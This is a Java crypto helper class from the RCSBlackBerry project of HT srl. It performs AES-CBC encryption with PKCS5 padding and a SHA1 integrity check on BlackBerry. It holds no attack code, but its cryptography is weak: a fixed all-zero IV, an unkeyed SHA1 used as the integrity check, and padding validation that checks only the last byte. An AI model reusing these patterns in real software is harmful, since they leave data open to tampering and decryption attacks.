//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.crypto;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Date;

import net.rim.device.api.crypto.AESDecryptorEngine;
import net.rim.device.api.crypto.AESEncryptorEngine;
import net.rim.device.api.crypto.AESKey;
import net.rim.device.api.crypto.BlockDecryptor;
import net.rim.device.api.crypto.BlockEncryptor;
import net.rim.device.api.crypto.CBCDecryptorEngine;
import net.rim.device.api.crypto.CBCEncryptorEngine;
import net.rim.device.api.crypto.CryptoException;
import net.rim.device.api.crypto.CryptoTokenException;
import net.rim.device.api.crypto.CryptoUnsupportedOperationException;
import net.rim.device.api.crypto.InitializationVector;
import net.rim.device.api.crypto.PKCS5FormatterEngine;
import net.rim.device.api.crypto.PKCS5UnformatterEngine;
import net.rim.device.api.crypto.SHA1Digest;
import net.rim.device.api.util.Arrays;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

public class EncryptionPKCS5 extends Encryption {
    //#ifdef DEBUG
    private static Debug debug = new Debug("EncryptionPKCS5",
            DebugLevel.INFORMATION);
    //#endif

    AESKey aeskey;

    public EncryptionPKCS5(byte[] key) {
        super(key);

    }

    public EncryptionPKCS5() {
        super();
    }

    public void makeKey(final byte[] key) {
        //#ifdef DBC
        Check.requires(key != null, "key null");
        //#endif
        //#ifdef DBC
        Check.requires(key.length == 16, "key not 16 bytes long");
        //#endif
        aes.makeKey(key, 128);

        aeskey = new AESKey(key);

        keyReady = true;
    }

    /**
     * Gets the next multiple.
     * 
     * @param len
     *            the len
     * @return the next multiple
     */
    public static int getNextMultiple(final int len) {
        //#ifdef DBC
        Check.requires(len >= 0, "len < 0");
        //#endif

        final int newlen = len + (16 - len % 16);

        //#ifdef DBC
        Check.ensures(newlen > len, "newlen <= len");
        //#endif
        //#ifdef DBC
        Check.ensures(newlen % 16 == 0, "Wrong newlen");
        //#endif
        return newlen;
    }

    protected byte[] pad(byte[] plain, int offset, int len) {
        return pad(plain, offset, len, true);
    }

    public byte[] decryptData(final byte[] cyphered, final int enclen,
            final int offset) throws CryptoException {
        //#ifdef DEBUG
        debug.trace("decryptData PKCS5");
        //#endif

        if (enclen % 16 != 0) {
            //#ifdef DEBUG
            debug.error("decryptData: wrong padding");
            //#endif
            throw new CryptoException();
        }

        //int padlen = cyphered[cyphered.length -1];
        //int plainlen = enclen - padlen;

        //#ifdef DBC
        Check.requires(keyReady, "Key not ready");
        Check.requires(enclen % 16 == 0, "Wrong padding");
        //Check.requires(enclen >= plainlen, "Wrong plainlen");
        //#endif

        final byte[] paddedplain = new byte[enclen];
        byte[] plain = null;
        int plainlen = 0;
        byte[] iv = new byte[16];

        final byte[] pt = new byte[16];

        final int numblock = enclen / 16;
        //final int lastBlockLen = plainlen % 16;
        try {
            for (int i = 0; i < numblock; i++) {
                final byte[] ct = Arrays.copy(cyphered, i * 16 + offset, 16);

                aes.decrypt(ct, pt);
                xor(pt, iv);
                iv = Arrays.copy(ct);
                Utils.copy(paddedplain, i * 16, pt, 0, 16);
            }

            int padlen = paddedplain[paddedplain.length - 1];

            if (padlen <= 0 || padlen > 16) {
                //#ifdef DEBUG
                debug.error("decryptData, wrong padlen: " + padlen);
                //#endif
                throw new CryptoException();
            }

            plainlen = enclen - padlen;
            plain = new byte[plainlen];

            Utils.copy(plain, 0, paddedplain, 0, plainlen);

        } catch (final CryptoTokenException e) {
            //#ifdef DEBUG
            debug.error("error decrypting data");
            //#endif
            return null;
        }

        return plain;
    }

    public byte[] encryptDataIntegrity(final byte[] plain) {

        byte[] sha = SHA1(plain);
        byte[] plainSha = Utils.concat(plain, sha);

        //#ifdef DBC
        Check.asserts(sha.length == SHA1Digest.DIGEST_LENGTH, "sha.length");
        Check.asserts(plainSha.length == plain.length
                + SHA1Digest.DIGEST_LENGTH, "plainSha.length");
        //#endif

        //#ifdef DEBUG
        debug.trace("encryptDataIntegrity plain: " + plain.length);
        debug.trace("encryptDataIntegrity plainSha: " + plainSha.length);
        //#endif

        long first = new Date().getTime();

        byte[] encrypted;
        try {
            encrypted = encryptRim(plainSha, 0);
        } catch (Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("encryptDataIntegrity");
            //#endif
            encrypted = encryptData(plainSha, 0);
        }

        return encrypted;
    }

    public byte[] decryptDataIntegrity(final byte[] cyphered, int len,
            int offset) throws CryptoException {

        byte[] plainSha;
        try {
            plainSha = decryptRim(cyphered, offset);
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("decryptDataIntegrity");
            //#endif
            plainSha = decryptData(cyphered, len, offset);
        }

        byte[] plain = Arrays.copy(plainSha, 0, plainSha.length
                - SHA1Digest.DIGEST_LENGTH);
        byte[] sha = Arrays.copy(plainSha, plainSha.length
                - SHA1Digest.DIGEST_LENGTH, SHA1Digest.DIGEST_LENGTH);
        byte[] calculatedSha = SHA1(plainSha, 0, plainSha.length
                - SHA1Digest.DIGEST_LENGTH);

        //#ifdef DBC
        //Check.asserts(SHA1Digest.DIGEST_LENGTH == 20, "DIGEST_LENGTH");
        Check.asserts(
                plain.length + SHA1Digest.DIGEST_LENGTH == plainSha.length,
                "plain.length");
        Check.asserts(sha.length == SHA1Digest.DIGEST_LENGTH, "sha.length");
        Check.asserts(calculatedSha.length == SHA1Digest.DIGEST_LENGTH,
                "calculatedSha.length");
        //#endif

        if (Utils.equals(calculatedSha, sha)) {
            //#ifdef DEBUG
            debug.trace("decryptDataIntegrity: sha corrected");
            //#endif
            return plain;
        } else {
            //#ifdef DEBUG
            debug.error("decryptDataIntegrity: sha error!");
            //#endif
            throw new CryptoException();
        }
    }

    public byte[] decryptDataIntegrity(byte[] rawConf) throws CryptoException {

        return decryptDataIntegrity(rawConf, rawConf.length, 0);
    }

    public byte[] encryptRim(byte[] plain, int offset)
            throws CryptoTokenException, CryptoUnsupportedOperationException,
            IOException {

        AESEncryptorEngine engine = new AESEncryptorEngine(aeskey);

        byte[] iv = new byte[16];
        Arrays.fill(iv, (byte) 0);
        InitializationVector ivc = new InitializationVector(iv);

        CBCEncryptorEngine cbc = new CBCEncryptorEngine(engine, ivc);
        PKCS5FormatterEngine formatter = new PKCS5FormatterEngine(cbc);

        ByteArrayOutputStream output = new ByteArrayOutputStream();
        BlockEncryptor encryptor = new BlockEncryptor(formatter, output);

        encryptor.write(plain, offset, plain.length - offset);
        encryptor.close();

        output.flush();
        byte[] cyphered = output.toByteArray();
        return cyphered;
    }

    public byte[] decryptRim(byte[] cyphered, int offset)
            throws CryptoTokenException, CryptoUnsupportedOperationException,
            IOException {

        AESDecryptorEngine engine = new AESDecryptorEngine(aeskey);

        byte[] iv = new byte[16];
        Arrays.fill(iv, (byte) 0);
        InitializationVector ivc = new InitializationVector(iv);

        CBCDecryptorEngine cbc = new CBCDecryptorEngine(engine, ivc);

        PKCS5UnformatterEngine formatter = new PKCS5UnformatterEngine(cbc);
        ByteArrayInputStream input = new ByteArrayInputStream(cyphered, offset,
                cyphered.length - offset);

        BlockDecryptor decryptor = new BlockDecryptor(formatter, input);
        ByteArrayOutputStream decryptedStream = new ByteArrayOutputStream();

        byte[] buffer = new byte[1024];
        int bytesRead = 0;
        do {
            bytesRead = decryptor.read(buffer);
            if (bytesRead != -1) {
                decryptedStream.write(buffer, 0, bytesRead);
            }
        } while (bytesRead != -1);

        byte[] decryptedBytes = decryptedStream.toByteArray();
        return decryptedBytes;
    }
}
